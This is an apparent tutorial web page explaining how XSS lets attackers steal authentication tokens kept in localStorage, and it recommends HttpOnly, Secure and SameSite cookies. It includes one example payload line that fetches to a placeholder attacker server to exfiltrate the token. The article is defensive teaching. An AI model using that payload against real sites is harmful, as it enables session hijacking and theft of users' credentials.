@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Why Storing Tokens in LocalStorage Causes XSS Theft - javascript</title>
+    <meta name="description" content="Storing authentication tokens in browser localStorage leaves JavaScript applications vulnerable to severe Cross-Site Scripting (XSS) attacks. Because localStorage lacks access controls against running scripts, any successfully injected malicious code can">
+    <link rel="canonical" href="https://salivity.github.io/javascript/article/why-storing-tokens-in-localstorage-causes-xss-theft">
+    <link rel="search" type="application/opensearchdescription+xml" title="javascript" href="/javascript/opensearch.xml">
+    <link rel="icon" href="/javascript/favicon.ico">
+    <link rel="stylesheet" href="/javascript/css/style.css">
+    <link media="print" rel="stylesheet" href="/javascript/css/print.css">
+    <script src="/javascript/js/fuse.min.js"></script>
+    <script src="/javascript/js/script.js"></script>
+    <script id="MathJax-script" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/4.1.3/tex-chtml.min.js" defer></script>
+    <script src="/monetize/monetize.js"></script>
+    <script src="/social/social.js"></script>
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Why Storing Tokens in LocalStorage Causes XSS Theft - javascript" />
+    <meta property="og:url" content="https://salivity.github.io/javascript/article/why-storing-tokens-in-localstorage-causes-xss-theft" />
+    <meta property="og:image:url" content="https://salivity.github.io/javascript/images/open-graph/default.webp" />
+    <meta property="og:image:secure_url" content="https://salivity.github.io/javascript/images/open-graph/default.webp" />
+    <meta property="og:image:width" content="1120" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:description" content="Storing authentication tokens in browser localStorage leaves JavaScript applications vulnerable to severe Cross-Site Scripting (XSS) attacks. Because localStorage lacks access controls against running scripts, any successfully injected malicious code can" />
+    <link rel="manifest" href="/javascript/pwa/manifest.json" />
+</head>
+<body>
+    <header>
+        <a href="/javascript/" aria-label="Go To Home Page" title="Go To Home Page" id="logo">
+            <span>salivity.github.io/</span><span>javascript</span>
+        </a>
+        <nav>
+            <ul class="header-links">
+                <li><a href="/javascript/search" title="Search" aria-label="Go To Search Page"><svg class="svg-icon" aria-hidden="true" focusable="false" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14"></path></svg></a></li>
+                <li><a id="theme-toggle" title="Theme" href="javascript:void(0);" aria-label="Toggle Website Theme"></a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <article><h1 id="why-storing-tokens-in-localstorage-causes-xss-theft">Why Storing
+Tokens in LocalStorage Causes XSS Theft</h1>
+<p>Storing authentication tokens in browser <code>localStorage</code>
+leaves JavaScript applications vulnerable to severe Cross-Site Scripting
+(XSS) attacks. Because <code>localStorage</code> lacks access controls
+against running scripts, any successfully injected malicious code can
+instantly retrieve, exfiltrate, and permanently compromise
+authentication credentials without user interaction.</p>
+<h3 id="the-javascript-accessibility-problem">The JavaScript
+Accessibility Problem</h3>
+<p>The primary flaw of <code>localStorage</code> stems from its design:
+it is completely accessible to any JavaScript running within the same
+origin. Web applications rarely run purely isolated, first-party code.
+Most modern applications rely on dozens of third-party libraries,
+tracking pixels, analytics suites, and content delivery networks.</p>
+<p>If an attacker identifies a single injection flaw—whether through
+unsanitized user input, compromised dependencies, or insecure inline
+scripts—they gain full execution rights within that origin. Unlike
+private variables encapsulated in application memory,
+<code>localStorage</code> provides a globally accessible API via
+<code>window.localStorage</code>.</p>
+<h3 id="instant-exfiltration-via-injected-code">Instant Exfiltration via
+Injected Code</h3>
+<p>When tokens reside in <code>localStorage</code>, stealing them
+requires minimal effort from an attacker. A basic XSS payload needs only
+one line to read and transmit the active user's credentials:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">fetch</span>(<span class="st">&#39;https://attacker-controlled-server.com/log?token=&#39;</span> <span class="op">+</span> localStorage<span class="op">.</span><span class="fu">getItem</span>(<span class="st">&#39;authToken&#39;</span>))<span class="op">;</span></span></code></pre></div>
+<p>Once executed, the victim's session token is sent silently in the
+background. The user experiences no interruption, visible redirection,
+or warning, meaning the theft goes entirely unnoticed.</p>
+<h3 id="why-the-compromise-is-often-permanent">Why the Compromise is
+Often Permanent</h3>
+<p>Token theft from <code>localStorage</code> creates a persistent
+security breach for several reasons:</p>
+<ol type="1">
+<li><strong>Persistence Across Sessions:</strong> Data placed in
+<code>localStorage</code> has no expiration date unless explicitly
+programmed into the application. It persists across browser restarts,
+system reboots, and tab closures, giving malicious scripts a constant
+window of availability.</li>
+<li><strong>Out-of-Band Usage:</strong> Once copied, tokens (such as
+JSON Web Tokens) can be used independently of the victim's browser. An
+attacker can import the stolen token into external tools, scripts, or
+automated frameworks to query the backend API directly from any
+location.</li>
+<li><strong>Stateless Limitations:</strong> Many modern applications use
+stateless JWTs to reduce database lookups. Because the backend verifies
+authentication using cryptographic signatures rather than a server-side
+session store, revoking a single stolen token is difficult without
+maintaining centralized blacklists or invalidating entire signing keys.
+The attacker retains access until the token naturally expires.</li>
+</ol>
+<h3 id="safer-alternatives-to-localstorage">Safer Alternatives to
+LocalStorage</h3>
+<p>To defend against XSS-driven token theft, web applications should
+store session credentials in <code>HttpOnly</code> cookies rather than
+client-side storage mechanisms like <code>localStorage</code> or
+<code>sessionStorage</code>.</p>
+<p>When a cookie includes the <code>HttpOnly</code> flag, the browser
+prohibits client-side scripts from reading it via
+<code>document.cookie</code>. Even if an attacker executes arbitrary
+JavaScript on the page, the browser will manage the cookie automatically
+during network requests while keeping the raw token string hidden from
+the malicious script. Pairing <code>HttpOnly</code> with the
+<code>Secure</code> and <code>SameSite</code> flags provides robust
+protection against both token exfiltration and Cross-Site Request
+Forgery (CSRF).</p></article>
+        <div id="comments-container"></div>
+
+        <script>
+            const utterancesScript = document.createElement('script');
+            
+            utterancesScript.setAttribute('src', 'https://utteranc.es/client.js');
+            utterancesScript.setAttribute('repo', 'salivity/javascript'); 
+            utterancesScript.setAttribute('issue-term', 'pathname'); 
+            utterancesScript.setAttribute('theme', localStorage.getItem('theme') === 'dark' ? 'github-dark' : 'github-light'); 
+            utterancesScript.setAttribute('crossorigin', 'anonymous');
+            utterancesScript.async = true;
+
+            document.getElementById('comments-container').appendChild(utterancesScript);
+        </script>
+    
+    </main>
+    <footer>
+        <nav>
+            <ul class="social-links">
+            </ul>
+        </nav>
+        <nav>
+            <ul class="footer-links">
+                <li><a href="/javascript/privacy-policy">Privacy Policy</a></li>
+                <li><a href="/javascript/terms-and-conditions">Terms and Conditions</a></li>
+            </ul>
+        </nav>
+        <div class="copyright">
+            Copyright &copy; <span id="current-year"></span>
+        </div>
+    </footer>
+</body>
+</html>
